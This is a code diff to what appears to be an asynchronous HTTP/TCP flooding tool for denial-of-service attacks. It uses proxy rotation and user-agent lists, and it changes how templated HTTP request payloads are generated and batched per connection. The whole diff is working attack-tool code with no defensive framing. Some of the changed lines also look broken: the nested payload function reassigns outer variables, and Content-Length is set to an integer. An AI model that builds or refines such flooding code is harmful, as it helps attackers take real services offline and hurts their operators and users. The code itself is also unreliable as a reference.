@@ -25,7 +25,7 @@ from .core import Methods
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import ProxySet
 from .targets import Target
-from .utils import GOSSolver, Tools
+from .utils import GOSSolver, Tools, Templater
 from .vendor.useragents import USERAGENTS
 
 
@@ -195,14 +195,18 @@ class AsyncTcpFlood(FloodBase):
         payload_type: FloodSpecType,
         payload,
         on_connect: Optional[asyncio.Future],
+        num_packets: Optional[int] = None,
     ) -> bool:
         on_close = self._loop.create_future()
+        if num_packets is None:
+            num_packets = self._settings.requests_per_connection
         flood_proto = partial(
             FloodIO,
             loop=self._loop,
             on_close=on_close,
             settings=self._settings,
-            flood_spec=FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
+            flood_spec=FloodSpec.from_any(
+                payload_type, payload, num_packets),
             connections=self._connections,
             on_connect=on_connect,
         )
@@ -236,7 +240,7 @@ class AsyncTcpFlood(FloodBase):
         return await self._exec_proto(conn, on_connect, on_close)
 
     async def HTTP_TEMPLATE(self, on_connect=None) -> bool:
-        def payload():
+        def payload_factory():
             get_opt = self._target.option
 
             req_type = get_opt('verb')
@@ -253,24 +257,30 @@ class AsyncTcpFlood(FloodBase):
                     parsed = json.loads(Tools.render(raw_headers))
                 headers.update(parsed)
 
-            if path_qs:
-                path_qs = Tools.render(path_qs)
+            def payload():
+                if path_qs:
+                    path_qs = Templater.render(path_qs)
 
-            if body:
-                body = Tools.render(body)
-                headers['Content-Length'] = str(len(body))
+                if body:
+                    body = Templater.render(body)
+                    headers['Content-Length'] = str(len(body))
+                else:
+                    headers['Content-Length'] = 0
 
-            return self.build_request(
-                req_type=req_type,
-                path_qs=path_qs,
-                headers=headers,
-                body=body
-            ) * self._settings.requests_per_buffer
+                return self.build_request(
+                    req_type=req_type,
+                    path_qs=path_qs,
+                    headers=headers,
+                    body=body
+                )
+
+            return b''.join(payload() for _ in range(self._settings.requests_per_buffer))
 
         return await self._generic_flood_proto(
-            FloodSpecType.BUFFER,
-            (payload, self._settings.requests_per_buffer),
-            on_connect
+            FloodSpecType.CALLABLE,
+            payload_factory,
+            on_connect,
+            self._settings.requests_per_connection // self._settings.requests_per_buffer,
         )
 
     async def GET(self, on_connect=None) -> bool:
